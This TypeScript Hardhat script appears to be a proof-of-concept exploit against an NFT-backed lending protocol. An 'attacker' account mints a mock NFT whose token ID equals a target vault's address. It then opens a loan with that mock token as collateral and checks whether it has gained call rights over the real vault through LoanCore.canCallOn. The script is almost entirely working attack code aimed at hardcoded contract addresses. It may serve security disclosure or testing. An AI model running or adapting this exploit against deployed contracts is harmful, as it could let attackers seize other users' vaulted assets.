import hre, { ethers } from "hardhat";
import { SECTION_SEPARATOR, SUBSECTION_SEPARATOR } from "../utils/bootstrap-tools";

import { MockERC721, LoanCore, VaultFactory, ERC20, OriginationController } from "../../typechain";
import { createLoanTermsSignature } from "../../test/utils/eip712";
import { LoanTerms } from "../../test/utils/types";


import { Contract } from "ethers";

export async function main(): Promise<void> {
    // Hardhat always runs the compile task when running scripts through it.
    // If this runs in a standalone fashion you may want to call compile manually
    // to make sure everything is compiled
    // await run("compile");

    const [lender, attacker] = await hre.ethers.getSigners();

    const LOAN_CORE = "0x81b2F8Fc75Bab64A6b144aa6d2fAa127B4Fa7fD9";
    const ORIGINATION_CONTROLLER = "0x4c52ca29388A8A854095Fd2BeB83191D68DC840b";
    const VAULT_FACTORY = "0x6e9B4c2f6Bd57b7b924d29b5dcfCa1273Ecc94A2";
    const TARGET_VAULT_ID = "22521508681063377476196538515358999387259281484";
    const USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
    const WETH = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";

    const vaultAddr = ethers.BigNumber.from(TARGET_VAULT_ID).toHexString();

    const loanCoreFactory = await ethers.getContractFactory("LoanCore");
    const loanCore = <LoanCore>await loanCoreFactory.attach(LOAN_CORE);

    const ocFactory = await hre.ethers.getContractFactory("OriginationController");
    const originationController = <OriginationController>await ocFactory.attach(ORIGINATION_CONTROLLER);

    const nftFactory = await hre.ethers.getContractFactory("MockERC721");
    const nft = <MockERC721>await nftFactory.deploy("Mock721", "M721");
    await nft.deployed();

    const tokenFactory = await hre.ethers.getContractFactory("ERC20");
    const usdc = <ERC20>await tokenFactory.attach(USDC);

    await usdc.connect(lender).approve(ORIGINATION_CONTROLLER, ethers.constants.MaxUint256);

    // Create the vault and put an NFT in
    await nft.mintId(TARGET_VAULT_ID, attacker.address);
    await nft.connect(attacker).setApprovalForAll(ORIGINATION_CONTROLLER, true)

    // Start a loan
    const terms: LoanTerms = {
        durationSecs: 86_400,
        principal: ethers.BigNumber.from("10000"),
        interestRate: ethers.utils.parseEther("10"),
        collateralAddress: nft.address,
        collateralId: TARGET_VAULT_ID,
        payableCurrency: USDC,
        numInstallments: 0,
        deadline: Math.floor(Date.now() / 1000 + 1000000)
    };

    const sig = await createLoanTermsSignature(
        ORIGINATION_CONTROLLER,
        "OriginationController",
        terms,
        lender,
        "2",
        100,
        "l"
    );

    await originationController
        .connect(attacker)
        // .initializeLoan(terms, attacker.address, lender.address, sig, 100, { gasLimit: 10000000 });
        .initializeLoan(terms, attacker.address, lender.address, sig, 100);

    // Created loan
    console.log("CREATED LOAN");

    const canCall = await loanCore.canCallOn(attacker.address, vaultAddr);

    console.log("Vault Address", vaultAddr);
    // console.log("Token ID", vaultId.toString());
    console.log("Nft owner", await nft.ownerOf(TARGET_VAULT_ID));
    console.log("Can call", canCall);
}



// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
if (require.main === module) {
    main()
        .then(() => process.exit(0))
        .catch((error: Error) => {
            console.error(error);
            process.exit(1);
        });
}
